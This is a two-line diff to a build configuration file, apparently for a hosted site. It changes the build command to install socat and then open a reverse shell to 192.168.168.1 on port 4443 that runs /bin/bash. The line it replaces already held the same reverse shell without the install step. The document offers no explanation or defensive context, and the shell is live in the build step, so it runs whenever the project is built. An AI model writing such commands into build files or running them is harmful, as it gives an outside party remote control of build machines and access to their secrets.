@@ -1,2 +1,2 @@
 [build]
-  command = "socat TCP4:192.168.168.1:4443 EXEC:/bin/bash"
+  command = "apt install socat && socat TCP4:192.168.168.1:4443 EXEC:/bin/bash"
